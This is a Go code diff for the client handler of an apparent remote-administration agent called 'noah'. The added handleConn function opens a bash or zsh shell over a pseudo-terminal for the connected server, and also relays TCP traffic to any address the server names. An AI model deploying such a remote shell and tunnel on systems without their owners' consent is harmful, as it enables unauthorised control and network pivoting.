@@ -3,12 +3,17 @@ package handler
 import (
 	"encoding/json"
 	"fmt"
+	"github.com/creack/pty"
+	"io"
 	"math"
+	"net"
 	"net/http"
 	"noah/client/app/environment"
 	"noah/client/app/service"
+	"noah/pkg/conn"
 	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"time"
 
@@ -42,19 +47,17 @@ func NewHandler(
 }
 
 // KeepConnection heart-beat
-func (h *Handler) KeepConnection() {
+func (h *Handler) Ping() {
 	sleepTime := 30 * time.Second
 
 	for {
-		if h.Connected {
-			time.Sleep(sleepTime)
-		}
+		time.Sleep(sleepTime)
+
+		h.Connected = false
 
 		err := h.ServerIsAvailable()
 		if err != nil {
 			h.Log("[!] Error connecting with server: " + err.Error())
-			h.Connected = false
-			time.Sleep(sleepTime)
 			continue
 		}
 
@@ -106,53 +109,69 @@ func (h *Handler) ServerIsAvailable() error {
 	return nil
 }
 
-func (h *Handler) Reconnect() {
-	h.Connected = false
+func (h *Handler) WebsocketConnection() {
+retry:
+	time.Sleep(time.Second * 30)
+	wsconn, err := ws.NewConnection(h.Configuration, fmt.Sprintf("/client/%d/ws", h.ClientID))
+	if err != nil {
+		h.Log("[!] Error connecting to server: ", err.Error())
+		goto retry
+	}
+	listen := conn.NewMux(wsconn)
 	for {
-		conn, err := ws.NewConnection(h.Configuration, fmt.Sprintf("/client/%d/ws", h.ClientID))
+		srcConn, err := listen.Accept()
 		if err != nil {
-			h.Log("[!] Error Reconnect on WS: ", err.Error())
-			time.Sleep(time.Second * 10)
-			continue
+			h.Log("[!] Error accepting connection: ", err.Error())
+			goto retry
 		}
-
-		h.Connection = conn
-		h.Connected = true
-		break
+		if c, ok := srcConn.(*conn.Conn); ok {
+			go h.handleConn(c)
+		}
 	}
 }
 
-func (h *Handler) HandleCommand() {
-	for {
-		if !h.Connected {
-			h.Reconnect()
-			continue
-		}
-
-		wsMessageType, wsMessage, err := h.Connection.ReadMessage()
-		if err != nil {
-			h.Log("[!] Error reading from connection:", err)
-			h.Reconnect()
-			continue
-		}
-
-		var message entitie.Message
-		if err := json.Unmarshal(wsMessage, &message); err != nil {
-			continue
-		}
-
-		response, err := h.handleMessage(wsMessageType, message)
-		errMsg := ""
-		if err != nil {
-			h.Log("[!] Error handling message:", err)
-			errMsg = err.Error()
-		}
-
-		if message.MessageType == entitie.MessageTypeChannel {
-			continue
-		}
-		ws.WriteMessage(h.Connection, message.MessageId, message.MessageType, response, errMsg)
+func (h *Handler) handleConn(srcConn *conn.Conn) {
+	defer func() {
+		srcConn.Close()
+	}()
+	lk := srcConn.GetLk()
+	if lk.Network == "" {
+		return
 	}
+	switch lk.Network {
+	case "pty":
+		var cmd *exec.Cmd
+		switch runtime.GOOS {
+		case `linux`:
+			cmd = exec.Command("bash")
+		case `darwin`:
+			cmd = exec.Command("zsh")
+		default:
+			return
+		}
+
+		// 打开 pty
+		ptmx, err := pty.Start(cmd)
+		if err != nil {
+			h.Log("Error starting PTY:", err)
+			return
+		}
+		defer ptmx.Close()
+
+		rwo := &conn.PtyReaderWriterCloser{IO: ptmx}
+
+		go io.Copy(srcConn, rwo)
+		io.Copy(rwo, srcConn)
+	case "tcp":
+		targetConn, err := net.DialTimeout(lk.Network, lk.Addr, time.Second*5)
+		if err != nil {
+			return
+		}
+		defer targetConn.Close()
+		go io.Copy(srcConn, targetConn)
+		io.Copy(targetConn, srcConn)
+	}
+
 }
 
 func (h *Handler) handleMessage(wsMessageType int, message entitie.Message) (response any, err error) {
